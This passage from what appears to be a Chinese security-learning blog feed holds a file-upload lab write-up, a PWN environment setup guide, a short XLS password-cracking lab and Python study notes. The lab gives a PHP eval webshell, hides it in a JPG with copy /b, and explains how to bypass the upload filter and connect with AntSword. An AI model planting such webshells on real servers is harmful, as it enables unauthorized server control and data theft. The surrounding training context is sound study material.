    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复，【上一次漏洞地址】。”墨者”负责对修复后的系统做复测，然而发现还是存在高危漏洞。</p><p>实训目标</p><ol><li>掌握常见图片类型的文件头内容；</li><li>掌握表单数据通过POST提交数据时，对数据的修改方法；</li><li>了解WebShell是什么及其作用；</li><li>了解PHP程序的WebShell脚本的执行原理；</li></ol><p>解题方向</p><p>绕过页面对可执行文件上传的限制，利用WebShell读取服务器上的源代码内容。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>随便上传一个图片，返回信息为：文件上传成功，保存于：uploads/王也1.jpg</p><p>制作一句话图片木马</p><pre><code class="hljs">&lt;?php @eval($_POST['woshimuma']); ?&gt;</code></pre><p>新建文件下一句话，在其下存入木马文件2.php和图片1.jpg,在该目录下打开cmd</p><pre><code class="hljs">copy 1.jpg/b+2.php muma.jpg</code></pre><p>生成一句话图片木马，上传，bp拦截，修改<code>muma.jpg</code>后缀为php。</p><p>上传成功，得到路径，使用蚁剑连接。</p><p>蚁剑连接成功：<br>（图床又有毛病了，直接手打吧）</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url地址： ip:端口<span class="hljs-regexp">/uploads/mum</span>a.php<br>连接密码： woshimuma1<br>编码设置： UTF8<br>连接类型： PHP<br></code></pre></td></tr></tbody></table></figure><p>找到key: <code>mozheece9dc52403a1a5249a9075e4de</code></p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="常见图片的头文件格式"><a href="#常见图片的头文件格式" class="headerlink" title="常见图片的头文件格式"></a>常见图片的头文件格式</h2><ol><li><code>.jpeg</code><ol><li>文件头标识 (2 bytes): 0XFF, 0XD8 (SOI)</li><li>文件结束标识 (2 bytes): 0XFF, 0XD9 (EOI)</li></ol></li><li><code>.png</code><ol><li>文件头标识 (8 bytes)：0X89 0X50 0X4E 0X47 0X0D 0X0A 0X1A 0X0A</li></ol></li><li><code>.bmp</code><ol><li>文件头标识 (2 bytes)：0X42 0X4D</li></ol></li><li><code>.gif</code><ol><li>文件头标识 (6 bytes)0X47 0X49 0X46 0X38 0X39(37) 0X61        G I F 8 9 (7) a</li></ol></li><li><code>.tiff</code><ol><li>文件头标识 (2 bytes) 0X4D 0X4D 或 0X49 0X49</li></ol></li></ol><h2 id="Form表单、四种常见的POST请求提交数据方式"><a href="#Form表单、四种常见的POST请求提交数据方式" class="headerlink" title="Form表单、四种常见的POST请求提交数据方式"></a>Form表单、四种常见的POST请求提交数据方式</h2><h3 id="浏览器行为：Form表单提交"><a href="#浏览器行为：Form表单提交" class="headerlink" title="浏览器行为：Form表单提交"></a>浏览器行为：Form表单提交</h3><ol><li>form表单常用属性<ol><li>action: url地址，服务器接收表单数据的地址</li><li>method: 提交服务器的http方法，一般为post和get</li><li>name: 唯一性</li><li>enctype: 表单数据提交时使用的编码类型，默认使用<code>pplication/x-www-form-urlencoded</code>,如果使用post请求，则请求头中的content-type指定值就是该值，如果表单中有上传文件，编码类型需要使用<code>multipart/form-data</code>类型，才能完成传递文件数据。</li></ol></li></ol><p>enctype为form表单数据的编码格式，Content-type为Http传输的数据的编码格式。</p><ol start="2"><li>浏览器提交表单时，会执行如下步骤<ol><li>识别出表单中表单元素的有效项，作为提交项</li><li>构建一个表单数据集</li><li>根据form表单中的enctype属性的值作为content-type对数据进行编码</li><li>根据form表单中的action属性和method属性向指定的地址发送数据</li></ol></li><li>提交方式<ol><li>get: 表单数据会被encodeURIComponent后以参数的形式：name=value&amp;name2=value2附带在url?后面，再发送给服务器，并在url中显示出来。</li><li>post: enctype默认<code>application/x-www-form-urlencoded</code>对表单数据进行编码，数据以键值对在http请求体重发送给服务器，如果enctype属性为<code>multipart/form-data</code>,则以消息的形式发送给服务器。</li></ol></li></ol><h3 id="Post请求下的Content-Type类型（编码类型）"><a href="#Post请求下的Content-Type类型（编码类型）" class="headerlink" title="Post请求下的Content-Type类型（编码类型）"></a>Post请求下的Content-Type类型（编码类型）</h3><ul><li>application/x-www-form-urlencoded</li></ul><p>浏览器的原生 <code>&lt;form&gt;</code> 表单，如果不设置 <code>enctype </code>属性，那么最终就会以 <code>application/x-www-form-urlencoded </code>方式提交数据。请求类似于下面这样:</p><pre><code class="hljs">POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=utf-8title=test&amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</code></pre><p><code>Content-Type</code> 被指定为 <code>application/x-www-form-urlencoded</code>；其次，提交的数据按照 <code>key1=val1&amp;key2=val2</code> 的方式进行编码，key 和 val 都进行了 URL 转码。</p><ul><li>multipart/form-data</li></ul><p>使用表单上传文件时，必须让<code> &lt;form&gt;</code> 表单的 enctype 等于 multipart/form-data。</p><ul><li>application/json</li><li>text/xml: 一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范</li></ul><p>相比之下，get方式的数据提交方式（编码方式）只有一种，就是application/x-www-form-urlencoding</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><code>webshell</code>是网页后门，本质上是一种网页文件，一般由asp,php,jsp,asp.net等语言开发，<code>shell</code>的含义是取得对服务器某种程度上操作命令。常见的webshell有小马，大马，一句话木马</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>webshell被站长常用于网站管理、服务器管理等。根据FSO权限不同，作用有在线编辑网页脚本、上传下载文件、查看数据库、执行任意程序命令等。</li><li>被入侵者利用，从而达到控制网站服务器的目的。</li></ol><h3 id="webshell常见检测方式"><a href="#webshell常见检测方式" class="headerlink" title="webshell常见检测方式"></a>webshell常见检测方式</h3><ul><li>静态检测：通过匹配特征码、特征值、危险函数来查找webshell，但只能查找已知的webshell，主流的检测方法有关键字检查、审核代码逻辑等。速度快、对已知的webshell查找准确率高；误报率高，存在漏报，会被绕过。</li><li>动态监测： webshell在执行时表现出来的特征，我们称为动态特征。准确性高，但耗时、占用资源多</li></ul><p>主流的检测方法有文件状态对比(File Info Comparison)、运行特征(Feature Matching)、访问行为检测(Access Behavior)等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;某部门为了方便内部人员上传聚餐的活动图片，在某服务器上新增的图片上传功能在被安全工程师”墨者”检测发现漏洞后，程序员做了修复</summary>
      
    
    
    
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="文件上传" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linux18下搭建PWN环境</title>
    <link href="https://sinky.top/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://sinky.top/2022/11/02/Linux18%E4%B8%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</id>
    <published>2022-11-02T01:07:48.104Z</published>
    <updated>2022-11-02T02:46:03.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h1><pre><code class="hljs">sudo apt-get update #更新源sudo apt-get install python-pip #安装pip</code></pre><blockquote><p>出现报错 :</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">E: 无法获得锁 <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend - open (<span class="hljs-number">11</span>: 资源暂时不可用)<br>E: 无法获取 dpkg 前端锁 (<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend)，是否有其他进程正占用它？<br></code></pre></td></tr></tbody></table></figure><blockquote><p>解决方法：</p></blockquote><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock-frontend<br>sudo rm <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archives/lock  <br>sudo rm <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/dpkg/</span>lock<br></code></pre></td></tr></tbody></table></figure><p>续：</p><pre><code class="hljs">pip install --upgrade pip # 升级pipsudo pip install setuptools #安装setuptoolssudo apt-get install python-dev #安装python-devsudo pip install pwntools #安装pwntools</code></pre><p>安装结束之后进入python交互模式，输入import pwn后无报错即可。</p><h1 id="安装其他插件"><a href="#安装其他插件" class="headerlink" title="安装其他插件"></a>安装其他插件</h1><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"> <span class="hljs-comment"># 安装socat</span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装socat </span><br>sudo apt install socat<br> <span class="hljs-comment"># 安装zio</span><br>sudo pip install zio​<br> <span class="hljs-comment"># 安装gcc</span><br>sudo apt-get install gcc<br> <span class="hljs-comment"># 安装gcc-multilib</span><br>sudo apt-get install gcc-multilib​<br> <span class="hljs-comment"># 安装gedit</span><br>sudo apt install gedit<br> <span class="hljs-comment"># 安装vim</span><br>sudo apt install vim<br> <span class="hljs-comment">#安装peda插件</span><br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/longld/</span>peda.git ~/peda<br>echo <span class="hljs-string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit<br> <span class="hljs-comment">#安装gef插件 </span><br>wget -q -O- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hugsy/g</span>ef<span class="hljs-regexp">/raw/m</span>aster/gef.sh | sh <br>wget -q -O ~<span class="hljs-regexp">/.gdbinit-gef.py https:/</span><span class="hljs-regexp">/github.com/</span>hugsy<span class="hljs-regexp">/gef/</span>raw<span class="hljs-regexp">/master/g</span>ef.py<br>echo source ~<span class="hljs-regexp">/.gdbinit-gef.py &gt;&gt; ~/</span>.gdbinit<br></code></pre></td></tr></tbody></table></figure><h1 id="IDA远程调试Linux"><a href="#IDA远程调试Linux" class="headerlink" title="IDA远程调试Linux"></a>IDA远程调试Linux</h1><p>顺便搞一下得了。</p><p>找IDA文件/dbgsrv下面的linux_server和linux_server64,我ida里的是linux_serverx64，不过问题不大。</p><p>将俩文件复制到linux下，并复制保存好改路径，一会儿要用。</p><p>ifconfig查看linux的ip，然后复制保存好，监听端口一般都是默认的23946不用管。</p><p>在linux上运行linux_server报错权限不足，用命令chmod开一下。</p><pre><code class="hljs">chmod 777 linux_server</code></pre><p>在linux端运行linux_server: <code>./linux_server</code></p><p>打开ida（32位的）</p><p>然后 <code>Debugger-&gt; Run-&gt; Remote Linux debugger</code></p><p>输入信息：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">Application: <span class="hljs-regexp">/home/</span>sudo<span class="hljs-regexp">/Desktop/i</span>da_linuxsever/linux_server<br>Directory: <span class="hljs-regexp">/home/</span>q<span class="hljs-regexp">/桌面/i</span>da_linuxsever<br>Parameters: [不用写]<br>Hostname: [linux的ip]<br>Password: [linux的密码]<br></code></pre></td></tr></tbody></table></figure><p>连接成功。</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="chmod用法"><a href="#chmod用法" class="headerlink" title="chmod用法"></a>chmod用法</h2><p>chmod 文件/目录权限设置命令</p><ol><li>语法：<code>chmod [对谁操作] [操作符] [赋予的权限] 文件名</code></li><li>操作对象：<ol><li>u 用户user,表现文件或目录的所有者</li><li>g 用户组group 表现文件或目录所属的用户组</li><li>o 其他用户other</li><li>a 所有用户all</li></ol></li><li>操作符： <ol><li><code>+</code> 添加权限</li><li><code>-</code> 减少权限</li><li><code>=</code> 直接给定一个权限</li></ol></li><li>权限： <code>r、w、x</code></li></ol><p>实例：（网上找的，感觉以后直接拿来用就好了）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u+x file 　　　 给file的属主增加执行权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 751 file 　　　 给file的属主分配读、写、执行(7)的权限，给file的所在组分配读、执行(5)的权限，给其他用户分配执行(1)的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> u=rwx,g=rx,o=x file 上例的另一种形式</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> =r file 　　　　为所有用户分配读权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 444 file 　　　　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> a-wx,a+r file 　　 　 同上例</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> -R u+r directory 　 递归地给directory目录下所有文件和子目录的属主分配读的权限</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 4755 　　设置用ID，给属主分配读、写和执行权限，给组和其他用户分配读、执行的权限。</span><br></code></pre></td></tr></tbody></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。r=4，w=2，x=1</p><blockquote><p>若要rwx属性则4+2+1=7；<br>若要rw-属性则4+2=6；<br>若要r-x属性则4+1=5。</p></blockquote><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装Pwntools&quot;&gt;&lt;a href=&quot;#安装Pwntools&quot; class=&quot;headerlink&quot; title=&quot;安装Pwntools&quot;&gt;&lt;/a&gt;安装Pwntools&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;sudo apt-get upda</summary>
      
    
    
    
    
    <category term="搭建环境" scheme="https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="ida远程" scheme="https://sinky.top/tags/ida%E8%BF%9C%E7%A8%8B/"/>
    
    <category term="linux" scheme="https://sinky.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>靶场：Xls文件分析溯源</title>
    <link href="https://sinky.top/2022/10/10/%E9%9D%B6%E5%9C%BA%EF%BC%9AXLS%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
    <id>https://sinky.top/2022/10/10/%E9%9D%B6%E5%9C%BA%EF%BC%9AXLS%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</id>
    <published>2022-10-10T12:50:30.608Z</published>
    <updated>2022-10-10T14:02:25.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>背景介绍</p><p>墨者机缘巧合下得到了一个Xls文件，打开却发现该文件带密码验证。</p><p>实训目标</p><p>了解Xls文件的密码猜解手段；</p><p>解题方向</p><p>对文件作密码猜解手段</p><p><img src="https://s2.loli.net/2022/10/10/O5K8wQLBEiZmXRJ.png" alt="image.png"></p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>搜到一个将xls文件后缀改成rar然后删除对应信息，然后解密的手段，试了一下，office2019没有这个bug，hhh.</p><p>不小心看到了评论区的解答，用了aopr直接把密码给爆破了……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;背景介绍&lt;/p&gt;
&lt;p&gt;墨者机缘巧合下得到了一个Xls文件，打开却发现该文件带密码验证。&lt;/p&gt;
&lt;p&gt;实训目标&lt;/p&gt;
&lt;p&gt;了解Xls文</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
    <category term="文件分析" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Python学习10-学生信息管理系统</title>
    <link href="https://sinky.top/2022/09/25/python%E5%AD%A6%E4%B9%A010/"/>
    <id>https://sinky.top/2022/09/25/python%E5%AD%A6%E4%B9%A010/</id>
    <published>2022-09-25T03:21:41.448Z</published>
    <updated>2022-10-10T13:00:20.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><ol><li>添加学生及成绩信息</li><li>将学生信息保存到文件中</li><li>修改和删除学生信息</li><li>查询学生信息</li><li>根据学生成绩进行排序</li><li>统计学生的总分</li></ol><h1 id="系统开发环境"><a href="#系统开发环境" class="headerlink" title="系统开发环境"></a>系统开发环境</h1><ol><li>操作系统：win10</li><li>python解释器：3.9</li><li>开发工具：pycharm</li><li>python内置模块：os,re</li></ol><h1 id="主函数功能"><a href="#主函数功能" class="headerlink" title="主函数功能"></a>主函数功能</h1><ol start="0"><li>退出系统</li><li>录入学生信息，insert()</li><li>查找学生信息，search()</li><li>删除学生信息，delete()</li><li>修改学生信息，modify()</li><li>对学生成绩排序，sort()</li><li>统计学生总人数，total()</li><li>显示所有的学生信息，show()</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;需求分析&quot;&gt;&lt;a href=&quot;#需求分析&quot; class=&quot;headerlink&quot; title=&quot;需求分析&quot;&gt;&lt;/a&gt;需求分析&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;添加学生及成绩信息&lt;/li&gt;
&lt;li&gt;将学生信息保存到文件中&lt;/li&gt;
&lt;li&gt;修改和删除学生信息&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习9</title>
    <link href="https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/"/>
    <id>https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/</id>
    <published>2022-09-23T04:08:22.625Z</published>
    <updated>2022-09-23T12:19:31.353Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><ul><li>一个模块中可以包含N多个函数</li><li>在python中一个扩展名为.py的文件就是一个模块</li><li>好处：<ul><li>方便其他程序和脚本的导入并使用</li><li>避免函数名和变量名冲突</li><li>提高代码的可维护性和可重用性</li></ul></li></ul><h2 id="自定义模块"><a href="#自定义模块" class="headerlink" title="自定义模块"></a>自定义模块</h2><ol><li>创建模块：新建一个.py文件，尽量不要与python自带的标准名呈相同</li><li>导入模块：<ol><li>所有： <code>import 模块名称 [as 别名]</code></li><li>指定： <code>from 模块名称 import 函数/变量/类</code></li></ol></li></ol><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import math#关于数学运算<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(math)</span></span>)#&lt;class <span class="hljs-string">'module'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math)</span></span>#&lt;module <span class="hljs-string">'math'</span> (built-<span class="hljs-keyword">in</span>)&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pi)</span></span>#<span class="hljs-number">3.141592653589793</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(dir(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pow(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)</span></span>)#<span class="hljs-number">8.0</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.ceil(<span class="hljs-number">9.00001</span>)</span></span>)#<span class="hljs-number">10</span> ceil 天花板<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.floor(<span class="hljs-number">9.99999</span>)</span></span>)#<span class="hljs-number">9</span> floor 地板<br></code></pre></td></tr></tbody></table></figure><p>或：</p><pre><code class="hljs">from math import piimport mathprint(pi)#3.141592653589793print(pow(2,3))#8 定义位置在builtins.pyprint(math.pow(2,3))# 8.0  定义位置在math.py</code></pre><p>eg:</p><p>(1) 创建calc.py 作为自定义模块</p><pre><code class="hljs">def add(a,b):    return a+bdef div(a,b):    return a/b</code></pre><p>(2)创建demo3.py调用自定义模块calc.py</p><pre><code class="hljs">import calcprint(calc.add(10,20))print(calc.div(10,4))</code></pre><p>或 </p><pre><code class="hljs">from calc import addprint(add(10,20))</code></pre><h2 id="以主程序形式运行"><a href="#以主程序形式运行" class="headerlink" title="以主程序形式运行"></a>以主程序形式运行</h2><p>在每个模块的定义中都包括一个记录模块名称的变量__name__，程序可以检查该变量以确定它在哪个模块中执行，若一个模块不是被导入到其他程序中执行，那么它可能在解释器的顶级模块中执行，顶级模块的__name__变量的值为__main__</p><pre><code class="hljs">if __name__=='__main__':        pass</code></pre><p>新建calc1.py中：</p><pre><code class="hljs">def add(a,b):    return a+bif __name__=='__name__':    print(add(10,20))</code></pre><p>在demo4.py中：</p><pre><code class="hljs">import calc1print(calc1.add(100,200))</code></pre><blockquote><p>只有运行calc1.py时，才会执行add(10,20);当demo4.py调用calc1时，不执行if语句中的内容</p></blockquote><h2 id="Python中的包"><a href="#Python中的包" class="headerlink" title="Python中的包"></a>Python中的包</h2><ol><li>包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下</li><li>作用：代码规范；避免模块名称冲突</li><li>包与目录的区别：<ol><li>包含__init__.py文件的目录称作包</li><li>目录中通常不包含__init__.py文件</li></ol></li><li>包的导入：<code>import 包名.模块名</code></li></ol><p>包：New-&gt;Python package  默认有__init__.py</p><p>目录：New-&gt;Directory </p><p>eg:</p><p>新建包pageage，在其下新建模块moduleA.py和moduleB.py</p><pre><code class="hljs">#moduleA.pya=10#moduleB.pyb=100</code></pre><p>新建demo5.py用于导入包：</p><pre><code class="hljs">import pageage.moduleA as ma #ma为别名 #print(pageage.moduleA.a)print(ma.a)</code></pre><p>导入带有包的模块时：</p><ol><li><p>使用import方式，只能跟包名或模块名</p><p> import pageage<br> import calc</p></li><li><p>使用from…import可以导入包，模块，函数，变量</p><p> from pageage import moduleA<br> from pageage.moduleA import a</p></li></ol><h2 id="常用内置模块"><a href="#常用内置模块" class="headerlink" title="常用内置模块"></a>常用内置模块</h2><ul><li>sys 与python解释器及其环境操作相关的标准库</li><li>time 提供与时间相关的各种函数的标准库</li><li>os 访问操作系统服务功能的标准库</li><li>calendar 日期相关标准库</li><li>urllib 读取来自我网上（服务器）的数据标准库</li><li>json 用于使用JSON序列化和反序列化对象</li><li>re 用于在字符串中执行正则表达式匹配和替换</li><li>math 算术相关标准库</li><li>decimal 精确控制运算精度，有效数位和四舍五入的十进制运算</li><li>logging 日志信息</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sys<br><span class="hljs-built_in">print</span>(sys.getsizeof(24))# 获得所占内存大小 28<br><span class="hljs-built_in">print</span>(sys.getsizeof(45))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">True</span>))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">False</span>))#24<br>import time<br><span class="hljs-built_in">print</span>(time.time())#1663919662.3144715<br><span class="hljs-built_in">print</span>(time.localtime(time.time()))#time.struct_time(<span class="hljs-attribute">tm_year</span>=2022, <span class="hljs-attribute">tm_mon</span>=9, <span class="hljs-attribute">tm_mday</span>=23, <span class="hljs-attribute">tm_hour</span>=15, <span class="hljs-attribute">tm_min</span>=54, <span class="hljs-attribute">tm_sec</span>=53, <span class="hljs-attribute">tm_wday</span>=4, <span class="hljs-attribute">tm_yday</span>=266, <span class="hljs-attribute">tm_isdst</span>=0)<br>import urllib.request<br><span class="hljs-built_in">print</span>(urllib.request.urlopen(<span class="hljs-string">'http://www.baidu.com'</span>).read())<br>import math<br><span class="hljs-built_in">print</span>(math.pi)#3.141592653589793<br></code></pre></td></tr></tbody></table></figure><h2 id="第三方模块的安装及使用"><a href="#第三方模块的安装及使用" class="headerlink" title="第三方模块的安装及使用"></a>第三方模块的安装及使用</h2><p>安装：<code>pip install 模块名</code></p><p>使用：<code>import 模块名</code></p><p>eg: <code>pip install schedule</code></p><p>ps：因为我电脑中是python2 3共存，所以先去安装了一下pip</p><p>pip下载地址：</p><p><a href="https://pypi.org/project/pip/#files" title="pip下载地址">https://pypi.org/project/pip/#files</a></p><p>安装：<code>python3.exe -m pip install pip22全名</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> schedule<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">job</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'哈哈----'</span>)<br> <span class="hljs-comment">#每三秒执行一次job()</span><br>schedule.every(<span class="hljs-number">3</span>).seconds.do(job)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    schedule.run_pending()<span class="hljs-comment">#启动</span><br>    time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#给予缓冲时间，休眠一秒</span><br></code></pre></td></tr></tbody></table></figure><h1 id="编码格式"><a href="#编码格式" class="headerlink" title="编码格式"></a>编码格式</h1><p>python解释器 ——Unicode(内存)</p><p>.py文件 在磁盘上 ——UTF-8(外存)</p><p><img src="/unicode.png"></p><p>eg: <code>#encoding=GBK</code></p><h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><ol><li><p>文件读写俗称‘IO操作’</p></li><li><p>内置函数open()创建文件对象</p><p> file=open(filename [,mode,encoding])</p></li></ol><p>file: 被创建的文件对象</p><p>mode: 打开模式默认为只读</p><p>encoding: 默认文本文件中字符的编写格式为GBK</p><p>eg:</p><ol><li>在磁盘上创建a.txt，内容：’中国’</li><li>用pycharm打开，转GBK</li><li>新建.py文件</li></ol><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'UTF-8'</span>)<span class="hljs-comment">#r 只读</span><br>print(<span class="hljs-built_in">file</span>.readlines())<span class="hljs-comment">#['中国\n']</span><br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#关闭系统释放资源</span><br></code></pre></td></tr></tbody></table></figure><p>ps: 转不了GBK,只好在读取的时候就设定编码格式了</p><h2 id="常用文件打开模式"><a href="#常用文件打开模式" class="headerlink" title="常用文件打开模式"></a>常用文件打开模式</h2><p>按文件中数据的组织形式分类：</p><ul><li>文本文件：存储普通’字符’文本，默认unicode，可用txt打开</li><li>二进制文件：以’字节’存储，必须用专用软件打开</li></ul><p>打开模式：</p><ul><li>r 